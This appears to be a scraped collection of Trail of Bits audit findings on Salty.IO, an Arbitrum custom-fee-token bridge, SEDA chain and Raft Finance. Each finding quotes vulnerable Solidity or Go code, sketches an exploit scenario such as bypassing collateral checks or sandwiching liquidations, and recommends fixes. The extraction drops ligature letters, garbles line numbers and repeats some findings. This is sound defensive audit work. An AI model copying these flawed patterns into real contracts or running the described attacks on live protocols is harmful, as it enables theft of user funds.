src/stable/Collateral.sol#L81-L88 However, the withdrawLiquidityAndClaim function, which is called by withdrawCollateralAndClaim, has public visibility with no access control mechanism in place. This means that the collateralization checks within the withdrawCollateralAndClaim function can be bypassed, and users can directly invoke withdrawLiquidityAndClaim to reclaim their liquidity assets while holding onto their USDS loans. 28 Salty.IO Security Assessment 77 function withdrawLiquidityAndClaim( IERC20 tokenA, IERC20 tokenB, uint256 liquidityToWithdraw, uint256 minReclaimedA, uint256 minReclaimedB, uint256 deadline ) public nonReentrant returns (uint256 reclaimedA, uint256 reclaimedB) 78 79 80 { // Make sure that the DAO isn't trying to remove liquidity require( msg.sender != address(exchangeConfig.dao()), \"DAO is not allowed to withdraw liquidity\" ); 81 82 83 84 (bytes32 poolID,) = PoolUtils._poolID( tokenA, tokenB ); // Reduce the user's liquidity share for the specified pool so that they receive less rewards. 85 // Cooldown is specified to prevent reward hunting (ie - quickly depositing and withdrawing large amounts of liquidity to snipe rewards) 86 well. 87 // This call will send any pending SALT rewards to msg.sender as // Note: _decreaseUserShare checks to make sure that the user has the specified liquidity share. 88 true ); 89 90 91 _decreaseUserShare( msg.sender, poolID, liquidityToWithdraw, // Remove the amount of liquidity specified by the user. // The liquidity in the pool is currently owned by this contract. (external call) 92 (reclaimedA, reclaimedB) = pools.removeLiquidity( tokenA, tokenB, liquidityToWithdraw, minReclaimedA, minReclaimedB, deadline ); 93 94 95 96 97 98 } // Transfer the reclaimed tokens to the user tokenA.safeTransfer( msg.sender, reclaimedA ); tokenB.safeTransfer( msg.sender, reclaimedB ); } Figure 8.2: src/staking/Liquidity.sol#L77-L98 Exploit Scenario Alice borrows USDS tokens from the protocol using her liquidity shares as collateral. Instead of repaying the loan to reclaim her liquidity shares, she directly accesses the withdrawLiquidityAndClaim function. By doing so, she withdraws her collateral assets while still holding onto her USDS loan, thereby stealing funds from the protocol. Recommendations Short term, restrict direct public access to the withdrawLiquidityAndClaim function. Consider changing its visibility to internal or introducing access control checks. Long term, review critical operations in the codebase and ensure that proper access control mechanisms are put in place. 29 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "9. Lack of chain ID validation allows signature reuse across forks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "Without chain ID validation, a valid signature obtained on one blockchain fork or network can be reused on another with a dierent chain ID. The grantAccess function is responsible for validating a provided signature and granting access to a user within the context of a specic geographical version (geoVersion). It veries the authenticity of the signature, ensuring that it was generated by an authorized source, typically an o-chain verier. Upon successful verication, the users wallet status is upgraded and granted access. 56 // Grant access to the sender for the given geoVersion (which is incremented when new regions are restricted). 57 // Requires the accompanying correct message signature from the off chain verifier. 58 59 60 function grantAccess(bytes memory signature) public { require( verifyWhitelist(msg.sender, signature), \"Incorrect AccessManager.grantAccess signatory\" ); 61 62 63 _walletsWithAccess[geoVersion][msg.sender] = true; } Figure 9.1: The grantAccess function However, the signature schema does not account for the contracts chain. As a result, if the protocol is deployed on multiple chains, one valid signature will be reusable across all of the available forks. Recommendations Short term, add the chain ID opcode to the signature schema. Long term, identify and document the risks associated with having forks of multiple chains and develop related mitigation strategies. 30 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. Chainlink oracles could return stale price data ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The latestRoundData() function from Chainlink oracles returns ve values: roundId, answer, startedAt, updatedAt, and answeredInRound. The PriceConverter contract reads only the answer value and discards the rest. This can cause outdated prices to be used for token conversions. 27 // Returns a Chainlink oracle price with 18 decimals (converted from Chainlink's 8 decimals). 28 29 // Returns zero on any type of failure. function latestChainlinkPrice(address _chainlinkFeed) public view returns (uint256) 30 31 { AggregatorV3Interface chainlinkFeed = AggregatorV3Interface(_chainlinkFeed); 32 33 34 35 36 37 38 39 40 41 42 43 44 45 int256 price = 0; try chainlinkFeed.latestRoundData() returns ( uint80, // _roundID int256 _price, uint256, // _startedAt uint256, // _timeStamp uint80 // _answeredInRound ) { price = _price; } Figure 10.1: All returned data other than the answer value is ignored during the call to a Chainlink feeds latestRoundData method. (src/price_feed/CoreChainlinkFeed.sol#L67L71) According to the Chainlink documentation, if the latestRoundData() function is used, the updatedAt value should be checked to ensure that the returned value is recent enough for the application. 31 Salty.IO Security Assessment Recommendations Short term, make sure that the oracle queries check for up-to-date data. In the case of stale oracle data, have the latestRoundData() function return zero to indicate failure. Long term, review the documentation for Chainlink and other oracle integrations to ensure that all of the security requirements are met to avoid potential issues, and add tests that take these possible situations into account. 32 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Lack of timely price feed updates may result in loss of funds ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The prices used to check loan health and maximum borrowable value are updated manually by calling performUpkeep on the PriceAggregator contract. There are incentives to call the price update function, and the client has indicated it will be running a bot to perform this and other upkeeps, but there is no guarantee that this will happen. The most recently updated prices are stored in the _lastPriceOnUpkeepBTC and _lastPriceOnUpkeepETH lists; however, there is no indication as to when they were last updated. function _updatePriceBTC() internal { uint256 price1 = _getPriceBTC(priceFeed1); uint256 price2 = _getPriceBTC(priceFeed2); uint256 price3 = _getPriceBTC(priceFeed3); _lastPriceOnUpkeepBTC = _aggregatePrices(price1, price2, price3); } function _updatePriceETH() internal { uint256 price1 = _getPriceETH(priceFeed1); uint256 price2 = _getPriceETH(priceFeed2); uint256 price3 = _getPriceETH(priceFeed3); _lastPriceOnUpkeepETH = _aggregatePrices(price1, price2, price3); } // Cache the current prices of BTC and ETH until the next performUpkeep // Publicly callable without restriction as the function simply updates the BTC and ETH prices as read from the PriceFeed (which is a trusted source of price). function performUpkeep() public { _updatePriceBTC(); _updatePriceETH(); } 33 Salty.IO Security Assessment Figure 11.1: src/stable/Collateral.sol#L81-L88 Exploit Scenario The Salty.IO bot goes down and does not update prices. During this time, the market drops sharply. Because the prices are stale, Eve is able to borrow signicantly at inated prices. When the bot nally resumes, all of Eves loans are below 100% collateralization. Recommendations Short term, have the code store the timestamp of the last update and have the price checks revert if the timestamp is too old. Long term, remove the price caching pattern altogether and replace it with a check of the price feeds when getPriceBTC or getPriceETH are called. 34 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "12. USDS stablecoin may become undercollateralized ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "In a downtrending market, a black swan type event could cause the USDS stablecoin to become undercollateralized. When a loan is liquidated, 5% of the collateral is sent to the liquidator as a fee. If 105% of the collateral is not received, the protocol will suer a loss. Furthermore, the collateral seized from liquidations is not immediately sold; instead, it is registered as a counterswap to be sold the next time a matching buy order is placed. In a downtrending market, especially during a ash crash, this forces the protocol to retain these assets as they decline in value. We also noted that the collateralization ratio is calculated assuming that the price of USDS is $1. Exploit Scenario The market crashes, and liquidations are triggered. The liquidations result in the seizure of WBTC and WETH, which are deposited in the Pools contract until a counterswap occurs. As the market continues to fall, no buy orders are placed, and no counterswaps are triggered. Salty.IO suers losses from being naked long the tokens. When the ash crash bottoms out and reverses, the counterswaps are immediately triggered, locking in the unrealized losses at the bottom. Recommendations Short term, analyze the issue and identify a possible solution for this problem. This problem does not have a simple solution and is inherent in the design of the protocol. Any solution should be thoughtfully considered and tested. Risks that are not addressed should be clearly documented. Long term, create a design specication that identies the interactions and risks between the protocols features. Test scenarios combined with fuzzing can be used to simulate adverse market conditions and identify weaknesses. 35 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "1. Risk of denial-of-service attacks on token whitelisting process ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The token whitelisting process can be disrupted by a malicious user submitting spurious proposals. The proposeTokenWhitelisting function allows users to submit proposals for adding new tokens to the whitelist. If the requirements are met, it creates a unique proposal and includes it in the pending whitelisting proposals list. 121 function proposeTokenWhitelisting( IERC20 token, string memory tokenIconURL, string memory description ) public nonReentrant 122 123 124 125 { require( address(token) != address(0), \"token cannot be address(0)\" ); require( _openBallotsForTokenWhitelisting.length() < daoConfig.maxPendingTokensForWhitelisting(), \"The maximum number of token whitelisting proposals are already pending\" ); 126 require( poolsConfig.numberOfWhitelistedPools() < poolsConfig.maximumWhitelistedPools(), \"Maximum number of whitelisted pools already reached\" ); 127 require( ! poolsConfig.tokenHasBeenWhitelisted(token, exchangeConfig.wbtc(), exchangeConfig.weth()), \"The token has already been whitelisted\" ); 128 129 string memory ballotName = string.concat(\"whitelist:\", Strings.toHexString(address(token)) ); 130 131 uint256 ballotID = _possiblyCreateProposal( ballotName, BallotType.WHITELIST_TOKEN, address(token), 0, tokenIconURL, description, 2 * daoConfig.baseProposalCost() ); 132 133 _openBallotsForTokenWhitelisting.add( ballotID ); } Figure 1.1: src/dao/Proposals.sol#L121-L133 17 Salty.IO Security Assessment However, the maximum number of queueable token whitelisting proposals is currently capped at ve, which can be extended to a maximum of 12. This presents a potential vulnerability to denial-of-service attacks, as a malicious actor could persistently submit meaningless tokens to saturate the queue, thereby preventing legitimate token whitelisting proposals. 49 time. 50 51 // The maximum number of tokens that can be pending for whitelisting at any // Range: 3 to 12 with an adjustment of 1 uint256 public maxPendingTokensForWhitelisting = 5; Figure 1.2: src/dao/DAOConfig.sol#L49-L51 Furthermore, since voters may lack incentive to downvote these fraudulent proposals, the required quorum may never be reached to nalize the ballot, eectively blocking the service for an extended duration. Submitting a proposal requires a nonrefundable fee that is currently set at $500, which should prevent most frivolous attackers. However, this will not stop a motivated, well-funded attacker such as a competitor. Exploit Scenario When the Salty.IO protocol is deployed, Eve submits multiple proposals to whitelist fake tokens. These proposals ll up the queue, eectively obstructing the inclusion of genuine token whitelisting proposals in the queue. Once the protocol is able to get a quorum to remove one of the proposals, Eves bot immediately back runs the transaction with another proposal. Recommendations Short term, implement a mechanism that allows an authorized entity to remove undesirable or unwanted token whitelisting proposals from the queue of proposals. Alternatively, implement a larger sized deposit that would be returned to a legitimate proposer. Long term, review critical codebase operations to ensure consistent and comprehensive logging of essential information, promoting transparency, troubleshooting, and ecient system management. 18 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "2. Insu\u0000cient event generation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The protocol does not use events at all. As a result, it will be dicult to review the contracts behavior for correctness once they have been deployed. Events generated during contract execution aid in monitoring, baselining of behavior, and detection of suspicious activity. Without events, users and blockchain-monitoring systems cannot easily detect behavior that falls outside the baseline conditions; malfunctioning contracts and attacks could go undetected. Exploit Scenario An attacker discovers a vulnerability in one of the Salty.IO protocol contracts and modies its execution. Because these actions generate no events, the behavior goes unnoticed until there is follow-on damage, such as nancial loss. Recommendations Short term, add events for all operations that could contribute to a higher level of monitoring and alerting. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components. 19 Salty.IO Security Assessment", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Low"]}, {"title": "3. Transactions to add liquidity may be front run ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "Even with a properly set slippage guard, a depositor calling addLiquidity can be front run by a sole liquidity holder, which would cause the depositor to lose funds. When either of the reserves of a pool is less than the dust (100 wei), any call to addLiquidity will cause the pool to reset the reserves ratio. // If either reserve is less than dust then consider the pool to be empty and that the added liquidity will become the initial token ratio if ( ( reserve0 <= PoolUtils.DUST ) || ( reserve1 <= PoolUtils.DUST ) ) { // Update the reserves reserves.reserve0 += maxAmountA; reserves.reserve1 += maxAmountB; return ( maxAmountA, maxAmountB, Math.sqrt(maxAmountA * maxAmountB) ); } Figure 3.1: src/pools/Pools.sol#L112-L120 Exploit Scenario Eve is the sole liquidity holder in the WETH/DAI pool, which has reserves of 100 WETH and 200,000 DAI, for a ratio of 1:2,000.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "6. Liquidation fee is volatile and may be manipulated ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "The liquidation reward is intended to be 5% of the liquidity seized, but in actuality, it may range from close to 0% to close to 10%. The Salty.IO liquidation process is straightforward. When the loan-to-value (LTV) ratio of a loan drops below the threshold, liquidateUser may be called by anyone, and it will immediately liquidate the loan by removing the liquidity, seizing the WBTC and WETH, and paying a fee to the caller. The fee is intended to be 5% of the amount liquidated, which is estimated as 10% of the WETH seized. This assumes the WETH and WBTC will be equal in value. However, due to market forces, the actual ratio of values will diverge from 50:50 even if that was the ratio of the values of the initial deposit. // Liquidate a position which has fallen under the minimum collateral ratio. // A default 5% of the value of the collateral is sent to the caller, with the rest being sent to the Liquidator for later conversion to USDS which is then burned. function liquidateUser( address wallet ) public nonReentrant  // The caller receives a default 5% of the value of the liquidated collateral so we can just send them default 10% of the reclaimedWETH (as WBTC/WETH is a 50/50 pool). uint256 rewardedWETH = (2 * reclaimedWETH * stableConfig.rewardPercentForCallingLiquidation()) / 100;  // Reward the caller weth.safeTransfer( msg.sender, rewardedWETH ); Figure 6.1: src/stable/Collateral.sol#L144-L184 The value of WETH can be further manipulated by sandwiching a call to liquidateUser with a WBTC/WETH swap transaction, which could push the reserves of either token to 24 Salty.IO Security Assessment close to the dust amount. This could double the amount of WETH received by the liquidator; alternatively, it could reduce the amount of WETH to almost zero. Users who want to add liquidity, called LPs, and participate in LP staking rewards are expected to call the Liquidity contract; however, a user could also call addLiquidity directly on a pool, bypassing the AccessManager access control and associated geolocation check. Furthermore, a user may believe that by doing so they will participate in the arbitrage prot rewards, but in fact, they will not. Exploit Scenario Alice takes out a loan of USDS against her WBTC/WETH. Subsequently, Eve notices the LTV of the loan is below the threshold. She submits a transaction: 1. It rst swaps WETH for a signicant amount of WBTC from the collateral pool. 2. It then calls liquidateUser, and due to the estimate based on WETH, Alice receives signicantly more WETH than she was entitled to.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "12. USDS stablecoin may become undercollateralized ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-10-saltyio-securityreview.pdf", "body": "In a downtrending market, a black swan type event could cause the USDS stablecoin to become undercollateralized. When a loan is liquidated, 5% of the collateral is sent to the liquidator as a fee. If 105% of the collateral is not received, the protocol will suer a loss. Furthermore, the collateral seized from liquidations is not immediately sold; instead, it is registered as a counterswap to be sold the next time a matching buy order is placed. In a downtrending market, especially during a ash crash, this forces the protocol to retain these assets as they decline in value. We also noted that the collateralization ratio is calculated assuming that the price of USDS is $1. Exploit Scenario The market crashes, and liquidations are triggered. The liquidations result in the seizure of WBTC and WETH, which are deposited in the Pools contract until a counterswap occurs. As the market continues to fall, no buy orders are placed, and no counterswaps are triggered. Salty.IO suers losses from being naked long the tokens. When the ash crash bottoms out and reverses, the counterswaps are immediately triggered, locking in the unrealized losses at the bottom. Recommendations Short term, analyze the issue and identify a possible solution for this problem. This problem does not have a simple solution and is inherent in the design of the protocol. Any solution should be thoughtfully considered and tested. Risks that are not addressed should be clearly documented. Long term, create a design specication that identies the interactions and risks between the protocols features. Test scenarios combined with fuzzing can be used to simulate adverse market conditions and identify weaknesses. 35 Salty.IO Security Assessment 13. Zap operations may approve an incorrect number of tokens, leading to reversion Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-SALTY-13 Target: src/staking/Liquidity.sol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "1. Double entrypoint or DeFi integrated ERC20 tokens should not be used ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf", "body": "The use of ERC20 tokens with two or more entrypoints can allow an attack to drain the bridge. The use of ERC20 tokens for paying fees in the rollup/bridge requires a number of checks and restrictions to avoid loss of funds. One of these checks is implemented in the bridge when a withdraw is executed: function _executeLowLevelCall( address to, uint256 value, bytes memory data ) internal override returns (bool success, bytes memory returnData) { // we don't allow outgoing calls to native token contract because it could // result in loss of native tokens which are escrowed by ERC20Bridge if (to == nativeToken) { gvladika marked this conversation as resolved. revert CallTargetNotAllowed(nativeToken); } // first release native token IERC20(nativeToken).safeTransfer(to, value); success = true;  Figure 1.1: Header of the _executeLowLevelCall function in src/bridge/ERC20Bridge.sol Users are not allowed to directly call the native token address; otherwise, they could transfer funds out. However, this check will not be sucient if the token has more than one entrypoint (e.g., when two dierent addresses can be used to execute ERC20 operations, such as transfer). Another problematic type of ERC20 is tightly integrated in DeFi applications. For instance, the LUSD ERC20 token contains the following function: function burn(address _account, uint256 _amount) external override { _requireCallerIsBOorTroveMorSP(); _burn(_account, _amount); } Figure 1.2: Burn function from the LUSD token This token can be minted or burned through a manager contract (which is dierent from the token contract itself), thereby bypassing the above check. In particular, this DeFi allows LUSD token owners to open, close, or repay vaults, so all of the bridge ERC20 LUSD could be easily manipulated using the low-level callback without requiring allowances to be set up. Exploit Scenario A user creates a rollup that uses a double entrypoint tokens for fees, allowing any user to drain the bridge contract. Recommendations Short term, clearly document this limitation to make sure of this potential security issue. Long term, review the assumptions required by ERC20 tokens in order to be integrated in each component. References  Medium-severity bug in Balancer Labs", "labels": ["Trail of Bits", "Severity: High", "Difficulty: High"]}, {"title": "2. Token bridge will receive and lock ether ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf", "body": "The token bridges entrypoint for deposits can receive ether, but the token bridge cannot retrieve it in any way. Users deposit ERC20 tokens using the outboundTransfer* functions from the token bridge. An example is shown below: function outboundTransferCustomRefund( address _l1Token, address _refundTo, address _to, uint256 _amount, uint256 _maxGas, uint256 _gasPriceBid, bytes calldata _data ) public payable override returns (bytes memory res) {  Figure 1.2: Header of the outboundTransferCustomRefund function in src/tokenbridge/ethereum/gateway/L1OrbitERC20Gateway.sol This function will trigger the creation of a retryable ticket, so it needs funds to pay fees and gas. These fees can be paid using ether or some specic ERC20, but in dierent token bridge deployments that share the same interface. In the latter case, the entry function should not receive ether even though it is payable. Exploit Scenario A user accidentally provides ether to a token bridge associated with a rollup that uses a custom ERC20 token fee. The ether will be locked in the token bridge. Recommendations Short term, add a condition that checks the value provided into the outboundTransfer function, and have the function revert if the value is positive. Long term, review how funds ow from the user to/from dierent components, and ensure that there are no situations where tokens can be trapped. 3. Cross-chain message out-of-order execution could a\u0000ect correct token bridge deployment Severity: Medium Diculty: High Type: Undened Behavior Finding ID: TOB-ARB-CFT-002 Target: tokenbridge/ethereum/L1AtomicTokenBridgeCreator.sol", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "2. Token bridge will receive and lock ether ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf", "body": "The token bridges entrypoint for deposits can receive ether, but the token bridge cannot retrieve it in any way. Users deposit ERC20 tokens using the outboundTransfer* functions from the token bridge. An example is shown below: function outboundTransferCustomRefund( address _l1Token, address _refundTo, address _to, uint256 _amount, uint256 _maxGas, uint256 _gasPriceBid, bytes calldata _data ) public payable override returns (bytes memory res) {  Figure 1.2: Header of the outboundTransferCustomRefund function in src/tokenbridge/ethereum/gateway/L1OrbitERC20Gateway.sol This function will trigger the creation of a retryable ticket, so it needs funds to pay fees and gas. These fees can be paid using ether or some specic ERC20, but in dierent token bridge deployments that share the same interface. In the latter case, the entry function should not receive ether even though it is payable. Exploit Scenario A user accidentally provides ether to a token bridge associated with a rollup that uses a custom ERC20 token fee. The ether will be locked in the token bridge. Recommendations Short term, add a condition that checks the value provided into the outboundTransfer function, and have the function revert if the value is positive. Long term, review how funds ow from the user to/from dierent components, and ensure that there are no situations where tokens can be trapped.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Medium"]}, {"title": "3. Cross-chain message out-of-order execution could a\u0000ect correct token bridge deployment ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-09-offchain-labs-custom-fee-token-securityreview.pdf", "body": "Out-of-order execution of outbox transactions on L1 and retryable tickets on L2 can lead to unexpected results when a token bridge is created. This issue relies on the specic ordering of retryable tickets. The token bridge creation requires retryable tickets to be submitted and executed in a certain order: /** * @notice Deploy and initialize token bridge, both L1 and L2 sides, as part of a single TX. * @dev This is a single entrypoint of L1 token bridge creator. Function deploys L1 side of token bridge and then uses * 2 retryable tickets to deploy L2 side. 1st retryable deploys L2 factory. And then 'retryable sender' contract * is called to issue 2nd retryable which deploys and inits the rest of the contracts. L2 chain is determined by `inbox` parameter. * * * Token bridge can be deployed only once for certain inbox. Any further calls to `createTokenBridge` will revert * because L1 salts are already used at that point and L1 contracts are already deployed at canonical addresses for that inbox. * */ function createTokenBridge( address inbox, address rollupOwner, uint256 maxGasForContracts, uint256 gasPriceBid ) external payable {  Figure 3.1: Header of the createTokenBridge function in L1AtomicTokenBridgeCreator.sol However, a malicious user can leverage the out-of-order execution of retryable tickets to break the assumptions of the token bridge creator and produce a failed deployment. Exploit Scenario Alice starts the deployment of a canonical token bridge for a new rollup. Eve notices this deployment and spams the rollup bridge with transactions to increase the L2 gas cost, and the tickets are not auto-redeemed. Later, Eve can trigger the tickets out of order to produce a broken deployment. Alice will not be able to redeploy, and no canonical deployment of the token bridge can be used. Recommendations Short term, consider migrating part of the deployment steps to L2 and require a single retryable ticket to be executed. Long term, review all possible ways in which the out-of-order execution of retryable tickets may aect each component and document. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "1. Sensitive material stored in les with loose permissions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-seda-chaintokenmigration-securityreview.pdf", "body": "The SEDA node client stores sensitive material using overly loose le or folder permissions of 755 or higher. This includes the VRF key le in gures 1.1 and 1.2, the validator state le in gure 1.3, and the validator conguration le in gure 1.4. The nal example is in a le that instruments end-to-end testing and is included for thoroughness. pvKeyFile := config.PrivValidatorKeyFile() if err := os.MkdirAll(filepath.Dir(pvKeyFile), 0o755); err != nil { return nil, fmt.Errorf(\"could not create directory %q: %w\", filepath.Dir(pvKeyFile), err) } Figure 1.1: The validator key le is stored in a directory with permission code 755, allowing every user on the system to view the le. (seda-chain/app/utils/vrf_key.go#229232) keyFilePath := config.PrivValidatorKeyFile() if err := os.MkdirAll(filepath.Dir(keyFilePath), 0o777); err != nil { return fmt.Errorf(\"could not create directory %q: %w\", filepath.Dir(keyFilePath), err) } Figure 1.2: The validator key le is stored in a directory with permission code 777, allowing every user on the system to view and modify the le. (seda-chain/cmd/sedad/cmd/init.go#4043) stateFilePath := config.PrivValidatorStateFile() if err := os.MkdirAll(filepath.Dir(stateFilePath), 0o777); err != nil { return fmt.Errorf(\"could not create directory %q: %w\", filepath.Dir(stateFilePath), err) } Figure 1.3: The validator state le is stored in a directory with permission code 777, allowing every user on the system to view and modify the le. (seda-chain/cmd/sedad/cmd/init.go#4447) func (v *validator) createConfig() error { p := path.Join(v.configDir(), \"config\") return os.MkdirAll(p, 0o755) } Figure 1.4: The node conguration le is stored in a directory with permission code 755, allowing every user on the system to view the le. (seda-chain/e2e/validator.go#6467) The code path in gure 1.4 is part of the test suite, not production code. Exploit Scenario A validator operator runs a node on a major cloud platform that includes a low-permission logging and metrics daemon on each compute instance used by its clients. Since SEDAs key material is stored in les permissioned so that any user on the system may view their contents, compromise of the logging daemon leads to compromise of the private key. Recommendations Short term, modify the created directory permissions to use permission code 0750, or a more restrictive code if possible. This modication should include less sensitive les such as the conguration and state les because enforcing rules around le permissions is easier if the rules are the same regardless of le content. Long term, establish internal code quality guidelines that establish the proper methods through which les can be created. This nding was discovered using Gosec, so the SEDA repository may benet from more regular use of Gosec or from making it a requirement in the repositorys CI pipeline.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "2. panic() is overused for error management ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-03-seda-chaintokenmigration-securityreview.pdf", "body": "The SEDA Cosmos modules for staking and vesting use panic() statements for certain error cases, as shown in gures 2.1 and 2.2. Gos panic mechanism is not recommended for use in Go applications except for the most fatal errors that require an immediate halt of the applications runtime. maxEntries, err := k.MaxEntries(ctx) if err != nil { panic(err) } valSrcAddr, err := sdk.ValAddressFromBech32(toRedelegation.ValidatorSrcAddress) if err != nil { panic(err) } valDstAddr, err := sdk.ValAddressFromBech32(toRedelegation.ValidatorDstAddress) if err != nil { panic(err) } Figure 2.1: The panic() statement is used to immediately terminate the application in the staking module. (seda-chain/x/staking/keeper/keeper.go#6274) if !toClawBackStaking.IsZero() { panic(\"failed to claw back full amount\") } Figure 2.2: The panic() statement is used to immediately terminate the application in the vesting module. (seda-chain/x/vesting/keeper/msg_server.go#257259) Exploit Scenario The code containing panic() statements is called by out-of-block code (e.g., during the BeginBlock and EndBlock functions), and the panic causes the chain to halt. In the chains current state, this scenario is not possible, but given SEDAs planned changes, consider avoiding these panic-induced chain halts. Recommendations Short term, change uses of panic() to normal Go errors where applicable. Long term, consider banning the use of panic() in SEDAs code-contributing guidelines. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. Solidity compiler optimizations can be problematic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "The Raft Finance contracts have enabled compiler optimizations. There have been several optimization bugs with security implications. Additionally, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild use them, so how well they are being tested and exercised is unknown. High-severity security issues due to optimization bugs have occurred in the past. For example, a high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG . Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity v0.5.6 . More recently, a bug due to the incorrect caching of Keccak-256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizations causes a security vulnerability in the Raft Finance contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "2. Issues with Chainlink oracles return data validation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "Chainlink oracles are used to compute the price of a collateral token throughout the protocol. When validating the oracle's return data, the returned price is compared to the price of the previous round. However, there are a few issues with the validation:    The increase of the currentRoundId value may not be statically increasing across rounds. The only requirement is that the roundID increases monotonically. The updatedAt value in the oracle response is never checked, so potentially stale data could be coming from the priceAggregator contract. The roundId and answeredInRound values in the oracle response are not checked for equality, which could indicate that the answer returned by the oracle is fresh. function _badChainlinkResponse (ChainlinkResponse memory response) internal view returns ( bool ) { return !response.success || response.roundId == 0 || response.timestamp == 0 || response.timestamp > block.timestamp || response.answer <= 0 ; } Figure 2.1: The Chainlink oracle response validation logic Exploit Scenario The Chainlink oracle attempts to compare the current returned price to the price in the previous roundID . However, because the roundID did not increase by one from the previous round to the current round, the request fails, and the price oracle returns a failure. A stale price is then used by the protocol. Recommendations Short term, have the code validate that the timestamp value is greater than 0 to ensure that the data is fresh. Also, have the code check that the roundID and answeredInRound values are equal to ensure that the returned answer is not stale. Lastly check that the timestamp value is not decreasing from round to round. Long term, carefully investigate oracle integrations for potential footguns in order to conform to correct API usage. References  The Historical-Price-Feed-Data Project", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Incorrect constant for 1000-year periods ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "The Raft nance contracts rely on computing the exponential decay to determine the correct base rate for redemptions. In the MathUtils library, a period of 1000 years is chosen as the maximum time period for the decay exponent to prevent an overow. However, the _MINUTES_IN_1000_YEARS constant used is currently incorrect: /// @notice Number of minutes in 1000 years. uint256 internal constant _MINUTES_IN_1000_YEARS = 1000 * 356 days / 1 minutes; Figure 3.1: The declaration of the _MINUTES_IN_1000_YEARS constant Recommendations Short term, change the code to compute the _MINUTES_IN_1000_YEARS constant as 1000 * 365 days / 1 minutes . Long term, improve unit test coverage to uncover edge cases and ensure intended behavior throughout the system. Integrate Echidna and smart contract fuzzing in the system to triangulate subtle arithmetic issues.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. Inconsistent use of safeTransfer for collateralToken ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-04-tempus-raft-securityreview.pdf", "body": "The Raft contracts rely on ERC-20 tokens as collateral that must be deposited in order to mint R tokens. However, although the SafeERC20 library is used for collateral token transfers, there are a few places where the safeTransfer function is missing:  The transfer of collateralToken in the liquidate function in the PositionManager contract: if (!isRedistribution) { rToken.burn( msg.sender , entirePositionDebt); _totalDebt -= entirePositionDebt; emit TotalDebtChanged(_totalDebt); // Collateral is sent to protocol as a fee only in case of liquidation collateralToken.transfer(feeRecipient, collateralLiquidationFee); } collateralToken.transfer( msg.sender , collateralToSendToLiquidator); Figure 4.1: Unchecked transfers in PositionManager.liquidate  The transfer of stETH in the managePositionStETH function in the 